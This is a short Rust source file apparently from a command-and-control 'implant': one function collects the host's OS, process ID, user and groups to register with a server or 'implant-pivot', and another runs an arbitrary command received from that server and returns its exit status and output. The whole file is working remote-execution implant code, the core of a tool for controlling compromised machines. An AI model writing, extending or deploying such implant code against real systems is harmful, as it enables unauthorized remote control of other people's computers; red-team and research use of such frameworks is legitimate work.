/// Execute a task and return a protbuf Message
use anyhow::Result;
use crate::pb::{OsCmd, OsCmdOutput, Registration, os_cmd_output::Status};

pub fn register() -> Result<Registration> {
    let info = super::info::Info::new();
    Ok(Registration {
        addr: "".to_string(), // NOTE: The IP address is determined by the server or implant-pivot, not by the implant itself
        os: info.os()?,
        pid: info.pid()?,
        user: Some(info.user()?),
        groups: info.groups()?,
    })
}

pub fn exec(os_cmd: OsCmd) -> Result<OsCmdOutput> {
    let output = super::exec::exec(&os_cmd.cmd)?;
    Ok(OsCmdOutput {
        // status: output.status.code(),
        status: output.status.code()
            .map(|i| Status::Code(i)),
        stderr: output.stderr,
        stdout: output.stdout
    })
}
